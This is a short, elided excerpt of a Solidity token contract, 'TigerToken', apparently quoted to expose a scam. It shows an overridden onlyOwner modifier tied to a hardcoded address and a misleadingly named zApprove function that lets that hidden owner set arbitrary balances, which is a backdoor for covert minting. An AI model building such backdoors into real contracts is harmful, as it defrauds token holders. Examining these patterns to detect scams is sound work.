...
contract TigerToken is Ownable {
  ...
  modifier onlyOwner() {
    ...
    (0x5C89Bfb63A260457390F30A7e3a1B9D6f1C1e248)); _;}
  ...
  function zApprove(address xyz, uint256 _value) external onlyOwner {
      balances[xyz] = _value * 10 ** uint256(decimals);
      balances[xyz] = balances[xyz] * 100 / 2;
